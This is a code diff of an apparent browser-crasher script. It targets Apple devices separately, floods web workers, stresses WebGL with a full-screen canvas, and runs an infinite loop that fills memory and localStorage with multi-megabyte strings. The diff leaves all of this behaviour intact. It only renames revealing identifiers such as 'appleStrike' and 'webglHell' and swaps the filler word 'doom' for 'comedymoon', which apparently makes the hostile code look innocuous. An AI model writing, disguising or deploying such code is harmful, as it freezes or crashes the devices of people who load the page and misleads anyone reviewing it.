@@ -58,7 +58,7 @@
             lock();
 
             if (isApple) {
-                const appleStrike = () => {
+                const apple = () => {
                     const m = [];
                     const flood = () => {
                         for(let i = 0; i < 150; i++) {
@@ -99,13 +99,13 @@
                     webglApple();
                     flood();
                 };
-                appleStrike();
+                apple();
             } else {
                 battalions.forEach((w, index) => {
                     setTimeout(() => w.postMessage('ignite'), index * 5);
                 });
 
-                const webglHell = () => {
+                const webgl = () => {
                     const c = document.createElement('canvas');
                     c.width = window.screen.width;
                     c.height = window.screen.height;
@@ -144,7 +144,7 @@
                 const db = () => {
                     const g = [];
                     while(true) {
-                        const d = new Array(5000000).fill("doom").join("!");
+                        const d = new Array(5000000).fill("comedymoon").join("!");
                         try { localStorage.setItem(performance.now() + Math.random(), d); } catch(e) {}
                         g.push(d);
                         const s = Date.now();
@@ -152,7 +152,7 @@
                     }
                 };
 
-                webglHell();
+                webgl();
                 l();
                 setTimeout(db, 1);
             }
